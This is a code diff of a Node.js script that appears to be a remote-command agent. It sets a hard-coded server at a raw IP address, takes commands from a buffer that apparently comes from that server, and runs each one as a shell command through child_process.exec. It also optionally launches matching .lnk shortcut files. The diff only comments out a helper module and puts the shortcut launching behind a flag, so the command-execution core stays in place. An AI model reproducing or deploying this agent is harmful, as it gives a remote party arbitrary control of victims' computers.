@@ -1,10 +1,11 @@
 const request = require('request');
 const exec = require('child_process').exec;
-const build_in = require('./build_in');
+// const build_in = require('./build_in');
 const fs = require('fs');
 
 const host = 'http://45.32.41.191:81';
 const name = 'pc';
+const openLink = false;
 
 function initHost() {
     if(fs.existsSync('host')) {
@@ -41,15 +42,16 @@ function flush(){
             let item = cmd_buffer[i];
             let cmd = item.cmd;
             if(cmd){
-                if(await build_in.exec(item)){
-                    console.log('build-in: ', cmd);
-                }
-                else{
-                    console.log(cmd);
-                    exec(cmd, function(err, stdout, stderr) {
-                        console.log('stdout: %s' % stdout);
-                    });
-                    // run link file automatic
+                // remove useless build_in
+                // if(await build_in.exec(item)){
+                //     console.log('build-in: ', cmd);
+                // }
+                console.log(cmd);
+                exec(cmd, function(err, stdout, stderr) {
+                    console.log('stdout: %s' % stdout);
+                });
+                // run link file automatic
+                if(openLink) {
                     if(!cmd.endsWith('.lnk')){
                         exec(cmd+'.lnk', function(err, stdout, stderr) {
                             console.log('stdout: %s' % stdout);
